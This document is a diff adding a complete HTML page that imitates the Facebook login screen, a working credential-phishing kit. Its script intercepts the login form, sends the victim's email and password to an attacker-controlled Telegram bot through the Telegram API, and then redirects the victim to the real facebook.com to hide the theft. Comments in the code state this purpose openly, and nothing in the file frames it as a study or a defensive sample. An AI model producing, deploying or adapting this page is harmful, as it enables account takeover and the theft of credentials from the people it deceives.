@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .header {
+            background-color: #3b5998;
+            height: 80px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 200px;
+            color: white;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header h1 {
+            font-size: 40px;
+            font-weight: bold;
+        }
+        
+        .login-form {
+            width: 400px;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            margin-top: 40px;
+            text-align: center;
+        }
+        
+        .login-form h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #1c1e21;
+        }
+        
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+        
+        .login-form input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-form button {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .login-form button:hover {
+            background-color: #166fe5;
+        }
+        
+        .login-form a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: block;
+        }
+        
+        .login-form hr {
+            margin: 20px 0;
+            border: 0.5px solid #dddfe2;
+        }
+        
+        .login-form .create-account {
+            background-color: #42b72a;
+            padding: 14px;
+            border-radius: 6px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .login-form .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #737373;
+            padding-bottom: 30px;
+        }
+        
+        .footer a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .error-message {
+            color: #ff0000;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .success-message {
+            color: #1877f2;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>facebook</h1>
+    </div>
+    
+    <div class="login-form">
+        <h2>Log in to Facebook</h2>
+        <div id="errorMessage" class="error-message"></div>
+        <div id="successMessage" class="success-message"></div>
+        <form id="loginForm">
+            <input type="text" id="email" placeholder="Email or phone number" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit">Log In</button>
+            <a href="#">Forgotten password?</a>
+            <hr>
+            <div class="create-account">Create New Account</div>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <a href="#">English (UK)</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">ગુજરાતી</a>
+        <a href="#">اردو</a>
+        <a href="#">தமிழ்</a>
+        <a href="#">বাংলা</a>
+        <a href="#">मराठी</a>
+        <a href="#">తెలుగు</a>
+        <a href="#">ಕನ್ನಡ</a>
+        <a href="#">മലയാളം</a>
+        <a href="#">Español</a>
+        <br><br>
+        <a href="#">Sign Up</a>
+        <a href="#">Log In</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Video</a>
+        <a href="#">Places</a>
+        <a href="#">Games</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Store</a>
+        <a href="#">Meta Quest</a>
+        <a href="#">Instagram</a>
+        <a href="#">Threads</a>
+        <a href="#">Fundraisers</a>
+        <a href="#">Services</a>
+        <a href="#">Voting Information Centre</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Privacy Centre</a>
+        <a href="#">Groups</a>
+        <a href="#">About</a>
+        <a href="#">Create ad</a>
+        <a href="#">Create Page</a>
+        <a href="#">Developers</a>
+        <a href="#">Careers</a>
+        <a href="#">Cookies</a>
+        <a href="#">AdChoices</a>
+        <br><br>
+        <span>Meta © 2024</span>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('pass').value;
+            
+            // Validate inputs
+            if (!email || !password) {
+                document.getElementById('errorMessage').textContent = 'Please fill in all fields';
+                return;
+            }
+            
+            // Hide form and show success message (while credentials are actually sent to Telegram)
+            document.getElementById('loginForm').classList.add('hidden');
+            document.getElementById('successMessage').textContent = 'Logging in... Please wait';
+            
+            // Send credentials to Telegram bot
+            sendToTelegram(email, password);
+        });
+        
+        function sendToTelegram(email, password) {
+            // Replace YOUR_BOT_TOKEN and YOUR_CHAT_ID with your actual Telegram bot token and chat ID
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            const message = `New Facebook Credentials:\nEmail: ${email}\nPassword: ${password}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send message to Telegram');
+                    }
+                    // Redirect to actual Facebook login page after capture
+                    setTimeout(() => {
+                        window.location.href = 'https://www.facebook.com';
+                    }, 2000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Redirect anyway even if sending fails
+                    window.location.href = 'https://www.facebook.com';
+                });
+        }
+    </script>
+</body>
+</html>
